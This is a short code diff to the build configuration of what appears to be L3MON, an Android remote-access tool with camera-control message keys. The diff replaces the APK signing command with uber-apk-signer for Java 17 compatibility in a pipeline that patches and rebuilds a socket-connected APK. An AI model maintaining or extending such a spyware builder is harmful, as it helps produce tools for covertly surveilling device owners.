@@ -18,7 +18,9 @@ exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
 
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
+// Use uber-apk-signer for better Java 17 compatibility
+exports.uberApkSigner = path.join(__dirname, '../app/factory/', 'uber-apk-signer.jar');
+exports.signCommand = 'java -jar "' + exports.uberApkSigner + '" --apks "' + exports.apkBuildPath + '" --overwrite';
 
 exports.messageKeys = {
     camera: '0xCA',
